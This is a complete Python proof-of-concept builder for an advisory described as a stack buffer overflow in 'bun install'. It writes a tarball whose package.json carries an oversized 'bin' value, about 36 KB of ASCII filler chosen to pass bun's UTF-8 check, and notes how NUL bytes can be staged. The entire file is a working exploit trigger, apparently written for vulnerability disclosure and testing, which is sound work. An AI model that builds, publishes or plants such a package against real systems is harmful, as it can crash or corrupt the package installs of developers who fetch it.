#!/usr/bin/env python3
"""Builds poc.tgz: the trigger for GHSA-w6m4-cghj-h6wm (bun install stack buffer overflow).

The tarball contains one package whose package.json carries an oversized `bin` value.
Default length 36,153 bytes matches the original report. All bytes are ASCII (<= 0x7F),
which passes bun's UTF-8 validating copier. NUL can be staged via JSON \\u0000 escapes.

Usage:  python3 build_poc.py [length]      -> writes ./poc.tgz
"""
import io
import json
import sys
import tarfile


def build(length: int = 36153) -> bytes:
    filler = ("A" * 63 + "\n") * (length // 64) + "A" * (length % 64)
    value = filler[:length]
    pkg = {
        "name": "@poc/x",
        "version": "1.0.0",
        "bin": {"cli": value},
    }
    data = json.dumps(pkg, indent=2).encode()
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        ti = tarfile.TarInfo("package/package.json")
        ti.size = len(data)
        tf.addfile(ti, io.BytesIO(data))
    return buf.getvalue()


if __name__ == "__main__":
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 36153
    blob = build(n)
    open("poc.tgz", "wb").write(blob)
    print(f"poc.tgz written: {len(blob)} bytes (bin value {n} bytes)")
